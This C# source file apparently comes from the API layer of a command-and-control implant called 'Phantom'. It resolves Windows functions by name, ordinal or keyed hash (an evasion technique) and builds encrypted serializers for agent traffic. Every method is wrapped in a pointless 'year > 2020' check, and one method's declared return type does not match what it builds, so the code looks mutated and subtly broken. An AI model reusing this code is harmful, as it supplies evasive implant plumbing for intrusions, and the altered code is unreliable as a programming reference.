using PhantomInterop.Interfaces;
using System;
using PhantomInterop.Classes;
using PlaintextCryptography;
using PSKCryptography;
using PhantomInterop.Serializers;
using PhantomInterop.Classes.Api;
using SimpleResolver;
namespace Phantom.Api
{
    public class Api : IApi
    {
        private IWin32ApiResolver _win32ApiResolver;
        public Api()
        {
            _win32ApiResolver = new GetProcResolver();
        }
        

        public string NewUUID()
        {
            if(DateTime.Now.Year > 2020) { return Guid.NewGuid().ToString(); } else { return null; }
        }

        public RSAKeyGenerator NewRSAKeyPair(int szKey)
        {
            if(DateTime.Now.Year > 2020) { return new Cryptography.RSA.RSAKeyPair(szKey); } else { return null; }
        }

        public ICryptographySerializer NewEncryptedJsonSerializer(string uuid, Type cryptoType, string key = "")
        {
            if (string.IsNullOrEmpty(key))
            {
                Cryptography.RSA.RSAKeyPair keys = new Cryptography.RSA.RSAKeyPair(4096);
                key = keys.PrivateKey;
            }

            
            

            EncryptedJsonSerializer result;

            if (cryptoType == typeof(PlaintextCryptographyProvider))
            {
                PlaintextCryptographyProvider plain = new PlaintextCryptographyProvider(uuid, key);
                result = new EncryptedJsonSerializer(plain);
            } else if (cryptoType == typeof(PSKCryptographyProvider))
            {
                PSKCryptographyProvider psk = new PSKCryptographyProvider(uuid, key);
                result = new EncryptedJsonSerializer(psk);
            }
            else
            {
                throw new ArgumentException($"Unsupported cryptography type: {cryptoType.Name}");
            }
            if(DateTime.Now.Year > 2020) { return result; } else { return null; }
        }

        public T GetLibraryFunction<T>(Library library, string functionName, bool canLoadFromDisk = true, bool resolveForwards = true) where T : Delegate
        {
            if(DateTime.Now.Year > 2020) { return _win32ApiResolver.GetLibraryFunction<T>(library, functionName, canLoadFromDisk, resolveForwards); } else { return null; }
        }

        public T GetLibraryFunction<T>(Library library, short ordinal, bool canLoadFromDisk = true, bool resolveForwards = true) where T : Delegate
        {
            if(DateTime.Now.Year > 2020) { return _win32ApiResolver.GetLibraryFunction<T>(library, ordinal, canLoadFromDisk, resolveForwards); } else { return null; }
        }

        public T GetLibraryFunction<T>(Library library, string functionHash, long key, bool canLoadFromDisk = true, bool resolveForwards = true) where T : Delegate
        {
            if(DateTime.Now.Year > 2020) { return _win32ApiResolver.GetLibraryFunction<T>(library, functionHash, key, canLoadFromDisk, resolveForwards); } else { return null; }
        }
    }
}
